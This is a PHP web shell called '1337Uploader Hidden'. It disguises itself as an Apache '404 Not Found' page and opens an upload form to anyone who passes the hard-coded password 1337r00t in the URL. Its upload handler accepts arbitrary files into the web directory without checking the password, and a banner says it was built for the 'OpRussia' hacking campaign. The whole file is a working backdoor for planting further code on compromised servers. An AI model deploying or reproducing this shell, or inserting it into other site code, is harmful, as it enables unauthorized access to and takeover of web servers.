 <?php
///////////////////////////////////////////////////////////
//
// ex : localhost/1337r00t.php?pass=1337r00t
//
///////////////////////////////////////////////////////////
echo"  <title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ".$_SERVER['REQUEST_URI']." was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body>";
 
if(isset($_POST['uploaded']))
{
$file = $_FILES['files']['name'];
$files= $_FILES['files']['tmp_name'];
$folder="";
if(move_uploaded_file($files,$folder.$file))
{
$result = "Uploaded :<a href='$file' target='_blank'>=> Click Ur File ^_^</A>";
}
else
{
$result = "Fail -_- Try...";
}
}
/////////////////////////////////////////////////////////////////////
$password ="1337r00t";   // Your Password
/////////////////////////////////////////////////////////////////////
if($_GET['pass']==$password){
echo'
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>#~ 1337Uploader Hidden ~#</title>
</head>';
echo'
<head>
<style>
body { background-color:#000000; color:#25ff00; font-family:Verdana; font-size:11px; }
h1,h3 { color:white; font-family:Verdana; font-size:11px; }
input,textarea,select,button { color: rgb(0, 190, 0); background-color:#444; border:1px solid #4F4F4F; font-family:Verdana; font-size:11px; }
textarea { font-family:Courier; }
a { color:rgb(0, 190, 0); text-decoration:none; font-family:Verdana; font-size:11px; }
a:hover { color:rgb(0, 250, 0); }
td { font-size:12px; vertical-align:middle; }
th { font-size:13px; vertical-align:middle; }
table { empty-cells:show; }
.inf { color:#7F7F7F; }
</style>
</head>
<body>
<center>
<h3>1337Uploader Hidden</h3>
<h4>~# Coded By 1337r00t #!<h4>
<h1>~# Note: Coded script is made to be used for campaign OpRussia ~#</h1>
<form action="" method="post" enctype="multipart/form-data">
<input type="file" name="files" />
<input type="submit" name="uploaded" value="Upload">
</form>
'.$result.'
</body>
</html>';
}
?> 
